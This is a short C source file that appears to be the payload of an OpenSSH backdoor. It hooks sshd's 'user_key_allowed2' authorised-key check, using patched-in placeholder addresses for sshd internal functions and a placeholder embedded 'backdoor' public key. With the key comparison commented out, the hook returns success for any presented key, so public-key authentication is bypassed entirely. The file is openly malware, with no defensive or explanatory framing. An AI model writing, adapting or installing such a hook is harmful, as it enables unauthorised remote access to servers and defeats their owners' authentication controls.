#include "syscall.h"

#define KEY_TYPE_RSA 1
#define SSH_MAX_PUBKEY_BYTES 8192

void _strcpy(char *dst, char *src) {
	while(*src != '\0') {
		*dst++ = *src++;
	}

	*dst++ = '\0';
}

void _memset(unsigned char *dst, unsigned char val, int len) {
	while(len--) {
		*dst++ = val;
	}
}

typedef void* (*f_key_new)(int);
typedef int (*f_key_read)(void*, char**);
typedef int (*f_key_equal)(void*, void*);
typedef void (*f_restore_uid)(void);
typedef void (*f_key_free)(void*);
typedef int (*f_user_key_allowed2)(void*, void*, char*);

int hook_main(void *pw, void *key, char *file) {
	char *backdoor_pubkey_ptr;
	void *rsa_key;

	char backdoor_pubkey[SSH_MAX_PUBKEY_BYTES];

	f_key_new key_new = (f_key_new)(0xaaaaaaaabbbbbbbb);
	f_key_read key_read = (f_key_read)(0x1111111122222222);
	f_key_equal key_equal = (f_key_equal)(0x3333333344444444);
	f_restore_uid restore_uid = (f_restore_uid)(0x99999999aaaaaaaa);
	f_key_free key_free = (f_key_free)(0x5555555566666666);
	f_user_key_allowed2 user_key_allowed2 = (f_user_key_allowed2)(0x7777777788888888);
	_memset(backdoor_pubkey, 0, SSH_MAX_PUBKEY_BYTES);
	_strcpy(backdoor_pubkey, "\xaa\xbb\xcc\xdd");

	backdoor_pubkey_ptr = backdoor_pubkey;

	rsa_key = key_new(KEY_TYPE_RSA);
	key_read(rsa_key, &backdoor_pubkey_ptr);

	//if (key_equal(rsa_key, key)) {
		//restore_uid();
		//key_free(rsa_key);

		return 1;
	//}

	return user_key_allowed2(pw, key, file);
}
